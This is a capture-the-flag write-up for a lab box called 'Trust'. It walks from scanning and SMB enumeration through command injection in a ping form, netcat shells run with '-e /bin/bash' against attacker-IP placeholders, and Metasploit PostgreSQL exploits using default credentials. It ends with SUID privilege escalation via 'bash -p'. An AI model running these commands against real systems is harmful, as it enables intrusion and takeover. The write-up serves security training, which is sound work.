![ZTW Logo](../../Assets/Hacking_Labs_graphics_pwn_logo_1.png)

# Trust

Welcome to the Trust write up.

- [Trust](#trust)
  - [Recon Phase](#recon-phase)
  - [Enumeration Phase](#enumeration-phase)
    - [SSH](#ssh)
    - [HTTP port 80](#http-port-80)
    - [SMB](#smb)
      - [Enum4linux](#enum4linux)
      - [SMBmap](#smbmap)
      - [Connecting to SMB](#connecting-to-smb)
    - [HTTP 666](#http-666)
    - [Postgres 5432](#postgres-5432)
      - [Metasploit way](#metasploit-way)
      - [Manual way](#manual-way)
  - [Exploitation Phase](#exploitation-phase)
    - [HTTP 666](#http-666-1)
      - [Getting any shell](#getting-any-shell)
      - [Reverse shell or Bind shell](#reverse-shell-or-bind-shell)
    - [Postgres 5432](#postgres-5432-1)
      - [Copy from program cmd exec](#copy-from-program-cmd-exec)
      - [Create Lang](#create-lang)
  - [Privilege Escalation](#privilege-escalation)
    - [Linpeas](#linpeas)
      - [If you don't have internet on the when you are on the reverse shell.](#if-you-dont-have-internet-on-the-when-you-are-on-the-reverse-shell)
    - [Manual Way](#manual-way-1)
  - [Getting The Flag](#getting-the-flag)
- [References](#references)

## Recon Phase

like every good spy movie, we need to recon the target. During the Recon Phase,
the focus is on passive information gathering to understand the target's
environment without directly interacting with it. This involves collecting
publicly available data such as domain names, IP addresses, email addresses,
employee information, and social media profiles associated with the target
organization. Techniques such as open-source intelligence (OSINT),
DNS enumeration, WHOIS queries, and reconnaissance tools aid in gathering
this information.

![selfie with the PwnToOwn machine](../../Assets/PwnToOwn/reconpic.png)

![Website](../../Assets/PwnToOwn/PwnToOwn_WebSite.png)

![Flyer with details of the PwnToOwn challenge](../../Assets/PwnToOwn/Pwntoown_Flyer.jpg)

The flyer gave us a QR code that goes to the PwnToOwn page. This has lot of
details about the challenge.

- We need to connect to the WIFI to even see the PwnToOwn machine.
- WIFI SSID = `PwnToOwn`, WIFI Password = `ZTW2024!`
- There are many of the same two boxes hosted on the machine.
- The box seems to be hosted on the end of the subnet.
- IP of the boxes ranges from `10.0.0.` to `10.0.0.253`
- Need to submit to the leader board that is hosted on `http://10.0.0.14:80`

## Enumeration Phase

During the Enumeration Phase of a penetration test, the goal is to gather as
much information as possible about the target network or system. This involves
actively probing the target to identify potential vulnerabilities,
misconfigurations, or weaknesses. Techniques such as port scanning, service
identification, banner grabbing, and OS fingerprinting are commonly employed
to enumerate the target's infrastructure.

Since we have a list of active machines on the network. We can now pick the
machines, that we can attack because of the recon phase we that there are
duplicates of the boxes. In this write up we are going to pick `10.0.0.248`
as our zero machine.

```bash
sudo nmap -A -p- -sS  10.0.0.248
```

- `-A` - Enable OS detection, version detection, script scanning, and traceroute
- `-sS` - This option tells nmap to only complete half of the three-way this
- will tell ports are open because an open port will send a SYN-ACK back to
  nmap.
- `-p-` - Tells nmap to check every port from 1-65535. This will check every
  port that can possibly be opened.

**Results:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 15:25 EST
Nmap scan report for 10.0.0.248
Host is up (0.0047s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4c:70:f1:60:2c:c3:fc:35:15:b0:5e:d5:bb:e2:39:5e (ECDSA)
|_  256 3f:b0:81:ab:6e:5f:dc:6a:33:fd:68:2d:52:8e:db:4c (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: WE PWNED YOUR DUMB SITE
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
666/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Login :: Threatlocker Not Vulnerable Web App
|_Requested resource was login.php
5432/tcp open  postgresql  PostgreSQL DB 9.5.25
| ssl-cert: Subject: commonName=less
| Subject Alternative Name: DNS:less
| Not valid before: 2024-01-10T19:56:59
|_Not valid after:  2034-01-07T19:56:59
|_ssl-date: TLS randomness does not represent time
MAC Address: 00:15:5D:02:C3:02 (Microsoft)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 5m15s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-02-20T20:31:12
|_  start_date: N/A
|_nbstat: NetBIOS name: TRUST, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   4.65 ms 10.0.0.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.32 seconds
```

From this scan we can tell a few things right off the bat, Like it is an
Ubuntu Linux machine base off all the header. Lets start with port 22 `ssh`
server.

### SSH

`SSH` is on of the most command port open on linux machine. Secure Shell or
common referred to as `SSH` is a way to remotely connect to a system. Unlike
Remote Desktop protocol `RDP`, `SSH` is only a terminal interface.

Since we got the version from nmap we can use any search engine to look for
exploits. Unfortunately it seems like there are no exploit for openssh
version 8.9p1.

Another thing we can try to use brute force the user and passwords. There are
too many tool for brute forcing. To name a few:

- `Hydra`
- `John the ripper`

We will try hydra, We will use this command:

```bash
hydra -L <USER FILE> -P <PASSWORD FILE> <IP> ssh -t 4
```
- `-L` - This would be a text file that has a list of possible usernames for
  `ssh`.
- `-P` - This would be a text file that has a list of possible passwords for
  `ssh`.
  > NOTE: the lowercase `-l` and `-p` will only do one username or password.
- `<IP>` - this will be the target machine that we will lunch the attack
  against.
- `ssh` - This tells hydra that we are attack port 22.
- `-t`  - This tells hydra how many parallel task we want to run. This will
  basically run 4 hydras.

When we run this, It will fail because the username and login are not basic
username and passwords that can be found on a list.
> NOTE: You can brute force your way into anything, IF you give it enough time,
> It might just take a few years.

### HTTP port 80

Linux is one of the most popular for hosting websites because how little
resource linux uses. When we connect to the web site though we get this.

![Linux webpage for port 80](../../Assets/PwnToOwn/linuxwebserver.png)

It seems that this page was defaced by the Threatlocker Ops team. And when we
look at the source code there does seem like there is anything else.

![Linux webpage source page](../../Assets/PwnToOwn/linuxwebserversource.png)

### SMB

`SMB` is very common for windows machine/computer, it is the main way to share
file besides `FTP`. `SMB` tends to run on both 139 and 445. But sometime you
will find only port 139 is open only.
this is because 139 is for NetBIOS session, this was the main way for `SMB` to
work before the newer version of SMB starting to use port 445. And modern
version leave both open for backward compatibility.

In the `namp` scan, it also show that port 139 and 445 is open. And the `SYN`
scan show that it is the SMB service. We can use tools like `smbmap` or
`enum4linux` to scan the `SMB` service/share.

#### Enum4linux

To use `Enum4linux` you can use the following:

```bash
enum4linux -a <IP>
```

Using this command will try to use known usernames and get you basic info about
the `SMB`share. When we ran the scan we can even see the Temp share and what
permission we have on that share. Another thing that the scan found was the
password policy for the share. It even found a user called `alex`. The most
important thing to know is that you can connect to the share with a anonymous
user and that the only share we have access to is the `Temp` share.

#### SMBmap

To use `smbmap` you can use the following:

```bash
smbmap -H <IP> -p <port>
```

- `-H` - This tell `smbmap` what host to scan.
- `-p` - This tell `smbmap` what port to scan.

When we run this scan it don't show as much as `enum4linux` did. But its a lot
easy to ready what is on this share. The most important thing to know is that
you can connect to the share with a anonymous user and that the only share we
have access to is the `Temp` share.

#### Connecting to SMB

Now that we have some info about the `SMB` share, We can connect to the share
with the anonymous user. We can use the one of follow to do that:

```bash
smbclient --no-pass //<IP>/Temp
```

OR

```bash
smbmap -H <IP> -p 445 -r Temp
```

Once we connect to the `Temp` share, and use `dir` or `ls` we can see the
following files:

- Team1.log
- Team.log

Now we can use the `get` command to grab the files. And when we cat the
files, we can see this.

**Team.log**

```
CEO: Our site just got hacked.

Alex: what?

CEO: I want a better web server by monday end of day.

Alex: I can only have a basic one by monday, but can have it better by Friday.

CEO: Ok, It better look good by Friday then.

Alex: What about the hacked web site?

CEO: Leave It.

Alex: Ok

ALEX: I will start the new web site up now and work on it though out the week.

CEO: I want daily updates.

ALEX: ok
```

**Team1.log**

```
I.T: Hey Alex did you open a web server?

Alex: yes the old is got hacked.

I.T: ok, you have to to change user and password from admin:password to something better.

Alex: Wait how did you guys found what the user and password was?

I.T: The security team saw that a new server port was opened and then they just guess the password.

I.T: You have a course that you need to complete by friday.

Alex: ( ;-;) ok
```

The two files seems to be logs for the microsoft teams chat for a person named
Alex. From the files we now know that happen to the website that was on port
80 and that there is another web server active. This new website might have a
login page with the username and password being `admin:password`.

### HTTP 666

From the `nmap` scan, this port might be a another web server and this would be
kinda confirm with the messages form the `SMB` share. Now when we connect to
the port with a web browser we get this page.

![Web server on port 666](../../Assets/PwnToOwn/Webserverport666.png)

Even though the the username and password might have change it never hurt to
try it. So when we try the `admin:password` and get into the site.

![After logging to the login page](../../Assets/PwnToOwn/afterloginport666.png)

All we can do is say that alex is going to get fired soon.
exploring the site we can see that it have a ping utility tool on the site.

![Ping tool on the web page](../../Assets/PwnToOwn/port666pingtool.png)

This page seem to be using the native ping utility on ubuntu, So this might
have a command injection. we can test this by a few ways.

1. Add `|` to the end of the end of the IP
2. Add `;` to the end of the end of the IP
3. Add `&&` to the end of the end of the IP
4. Add `&` to the end of the end of the IP
5. Add `||` to the end of the end of the IP

**Example**

```bash
127.0.0.1 | <COMMMAND>
```

We can should use a command that is on every linux machine, `ls` command will
work. so when we run this.

```bash
-c 1 127.0.0.1 ; ls
```

- `-c 1` - This will tell the ping command to only send one ICMP packet, inside
  of four packets.
- `127.0.0.1` - This is the ip that the ping command will try to ping.
  > Note: 127.0.0.1 is the for local host. SO it will try to ping itself.
- `;` This will tell the web server to run the next command.
- `ls` This will list the current directory.

So when we run the command, we will get this.

![Results for Command injection test](../../Assets/PwnToOwn/pingresults.png)

From this we know that command injection works and now we can more the the
[Exploitation phase](#exploitation-phase) of the CTF.

### Postgres 5432

Postgresql is most used on the back end and in most cases it would be install
on a different server due to security. The default port is 5432. Since we don't
have a way to interact with it normally like a website to interact with it
without a user and password. We will might have to brute force into the database.

There two main way you can do this:

#### Metasploit way

With Metasploit we can use some enumeration tools to scan the postgres service.
We need to start up metaspolit with this command:

```bash
msfconsole
```

Once it start we can search for anything with the keyword `postgres` These should
be the results

![msf search postgress](../../Assets/PwnToOwn/msfsreach.png)

we should look that the following:

- auxiliary/admin/postgres/postgres_login
- auxiliary/admin/postgres/postgres_sql
- auxiliary/scanner/postgres/postgres_hashdump
- auxiliary/scanner/postgres/postgres_schemadump

When we select the postgres_login by using `use 9` and do `show options` or
`options` both will show what arguments you can use.

Now all we have to do is set `RHOSTS` and `RPORT` These two settings stand for
remote host and remote port and now we just have to run the auxiliary module.

```bash
set RHOSTS <IP>
set RPORT 5432
exploit
```

> Note: You can use the `setg` command instead of `set`. `setg` will set value
> you give it and set as a global setting.

After running this the postgres module, we found that the postgres is using the
default credentials `postgres:postgres`. Now we could look for some exploits.
Metasploits make this part SUPER easy with some modules that come with a check
functions.

You can use the full path like

```bash
use exploit/multi/http/manage_engine_dc_pmp_sqlinkViewFectchServlet.dat
```

OR

```bash
use 2
```

If you have been using the `setg` command then you shouldn't need to reset the
`rhosts` and `rport`. Once you have everything thing set you can now use the
`check` command, If the module you selected have a check function, `msf` will
run the check.

After a while you should have that the `copy from program cmd exec` and
`create lang` could be vulnerable.

Now we can move on to the exploit phase of the attack. [Exploit Phase](#exploitation-phase)

#### Manual way

Manual way is a lot harder but it can be done. The first thing we can do is to
Google how to even connect to the database by it self. Since normally you have
someway to interact with it without a `user` and `password`.

After some googling you might have come across that the default user and
password is `postgres:postgres`. It never hurt to try default credentials we
can do this by using `psql` command:

```bash
psql -h 10.0.0.248 -U postgres -W postgres -P 5432
```

After running the command. you should have a connection with the postgres.
now that we are in the database what can we do?

```bash
SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```

When we run this command we can see that we have python3 enable. And a lot of
google there is a might be a exploit that we can use and its called,
`Copy from program cmd exec` exploit. But this exploit needs `metasploit`

Now we can move on to the exploit phase of the attack.
[Exploit Phase](#exploitation-phase)

> Note: that the create lang was not talk about in the manual way.
> As its hard to find without automated tools.

## Exploitation Phase

### HTTP 666

Now that we know that the ping tool on the site can be a command injection
point. now we we can see. what can we do. when we run `whoami` we get www-data
user. We should note that on linux systems www-data normally is not a admin user
or sudo user. After a while putting `;`, `||`, `|`, `&&`, `&` to do our command
injection. We should get a reverse shell. 

#### Getting any shell

When we try any basic shell the shell will just get closed by the server. 
So we need a shell that won't get closed by the server. We can use the `mkfifo`
shell, The *ONE* down side of it is that it will keep the web server busy with
that `mkfifo` shell. Basically it will DOS the server for anyone else trying to
connect to the server. And if you mess up the `IP` or `PORT` you will lock your
self out of the machine.

#### Reverse shell or Bind shell

There are two methods for getting a connection that we can interact with. 

**Reverse Shell**: Communication initiated by the compromised system to the
attacker's system.

To do a reverse shell we need to open our listeners first before putting our 
reverse shell in. 

```bash
nc -lnvp <PORT>
```

- `-l`: This switch tells nc to operate in listening mode, which means it will
  listen for incoming connections rather than initiating connections.
- `-n`: This switch tells nc not to perform DNS resolution on any incoming
  addresses. This can speed up the operation, especially when dealing with IP addresses instead of domain names.
- `-v`: This switch enables verbose mode, which provides more detailed output,
  including information about incoming connections and data transfer.
- `-p` port: This switch specifies the port number on which nc should listen
  for incoming connections.

This is the shell that we will be using.
 
```bash
;nc -l <IP> <PORT> -e /bin/bash
```

If we did everything right we should have a shell on the computer and we can
move to the [Privilege Escalation phase](#privilege-escalation)

**Bind Shell**: Communication initiated by the attacker's system to the
compromised system.

This is the shell that we will be using 

> Note: Unlike the reverse shell we don't need to open a listeners first
 
```bash
;nc <IP> <PORT> -e /bin/bash
```

Don't forget that we need to make the connection, we can do that with the
`netcat` command

```bash
nc <IP> <PORT>
```

If we did everything right we should have a shell on the computer and we can
move to the [Privilege Escalation phase](#privilege-escalation)

### Postgres 5432

Okay now that we have two exploit that might work. Which even you chose
we will explain how to use both exploits.

#### Copy from program cmd exec

`Copy from program cmd exec` exploits works by creating a new table and then copy
the reverse shell payload and then output the table to run the exploit. Then
the exploit will clean of any tables it made to hide any evidence.

To start with is to start up metasploit.

```bash
msfconsole
```

Then can use the exploit, with this:

```bash
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

Now we can set our payload with this

```bash
show payloads
```

this will show all compatible payloads and will will use the
`cmd/unix/reverse_perl` shell

```bash
set payload cmd/unix/reverse_perl
```

Now all we have to do is to set all the settings for exploit.

```bash
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DATABASE           template1        yes       The database to authenticate against
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              5432             yes       The target port (TCP)
   TABLENAME          NKDxwGl79MMV     yes       A table name that does not exist (To avoid deletion)
   USERNAME           postgres         yes       The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

Using the `show options` or `options` command we can see that we need to
change the `RHOSTS` and `LHOST`

```bash
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set RHOSTS <remote IP>
RHOSTS => <remote IP>
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST <our IP>
LHOST => <our IP>
```

Now we can use our exploit. With the exploit command.
![running exploit](../../Assets/PwnToOwn/msfcmdexecexploit.png)

Now we have our shell and we are login as the `postgres` user. After looking
around we seem like we can't do much. Now we can move on the
[Privilege Escalation phase](#privilege-escalation)

#### Create Lang

The `Create lang` exploit works because we can exploit the create language
function to allow external scripting language function. Basically the
exploit is creating a new function with our exploit and then running it.

We need to select the exploit with this command

``` bash
use exploit/multi/postgres/postgres_createlang
```

now we need to find a good payload with

```bash
show payloads
```

We should select on of the linux payloads with a meterpreter payload.
This will make the sessions a lot better for us.

```bash
set payload payload/cmd/unix/python/meterpreter/bind_tcp
```

Now that we have our payload we need to configure the settings.

Now we can move on the [Privilege Escalation phase](#privilege-escalation)

## Privilege Escalation

Now that we are the on the system as www-data or postgres, You notice that
don't have a lot access, and we can't find a Flag.txt file anywhere, where we
have access. This means that we need to do a escalate our privilege. There is a
few ways to get more privilege:

1. take over a vulnerable application that have more access then we have.
2. find an SUID

> Note: There is a lot more way to escalate privilege but that could be its own
> class.

SUID are one the most easy box to check for privilege escalation. There are two
way to find SUID
1. linpeas https://github.com/carlospolop/PEASS-ng
2. manual way

To understand what an SUID is and why its a thing, you have to understand that
sometime on a linux system you might want something to always run as root. This
now is not as common but it was a thing. so the way we can tell is with the
`ls -la` command.

![SUID example](../../Assets/PwnToOwn/SUID.png)

You can see that there is an `s` where an `x` should be if SUID was disable on
the su command.

### Linpeas

Linpeas is very good at finding any privilege escalation method on a linux.

> Note: Don't think you are safe on windows computer too soon, because there
> is also Winpeas which is the linpeas of windows.

The first thing to do to get linpeas on the computer you are attacking.
You can download 

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20240223-ab2bb023/linpeas.sh
```

New problem, It seems that we can't write to most directory.

But we can write to the `/tmp` directory. Now we can download the linpeas.

To run Linpeas you can just do the following:

```bash
./linpeas.sh
```

#### If you don't have internet on the when you are on the reverse shell.

If the Machine you are attacking doesn't have internet then you wil have to
get linpeas on your attacker machine and then host a web server to transfer the
file over. 

```bash
python3 -m http.server
```

> Note: You have to be in the current directory of Linpeas to see the file.

Now on the machine that you want to use Linpeas, You have to now download the
file from the web server you are hosting.

```bash
wget <OUR Attacker machine IP>/linpeas.sh
```  

New problem, It seems that we can't write to most directory.

But we can write to the `/tmp` directory. Now we can download the linpeas.

Now you can run linpeas with the following:

```bash
./linpeas.sh
```

### Manual Way

The manual way is going to be a lot more work but that is ok.
We can use the following command to check if there is SUID set on a program.

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

This uses the find command to look for any program that have permission 4000
which is `-rwsr-xr-x`.

![After running the find command](../../Assets/PwnToOwn/findsuid.png)

Now that we have a list of programs that an SUID set we can go to the GTFO
website https://gtfobins.github.io/

Get the F**K out (GTFO) site is a site that have a list of programs that can
give you a privilege escalation method.

```bash
bash -p
```

Now we should have root and we can this by using the `whoami` command.

![Whoami command](../../Assets/PwnToOwn/root.png)

Now that we have root we can move on to getting the flag.

## Getting The Flag

Now that we are in as root of the system now we can navigate the system. After
a while of look we will find the `/home/alex/` folder with the `Flag.txt` file
and when we cat the `Flag.txt` we get the following:

```
ZTW{LINUXqggieliywxzqplgalrexiiesssfpvicf}
```

Now that we have the flag all we need to do is to go to the leader board and
submit the flag.

# References

GTFO https://gtfobins.github.io/

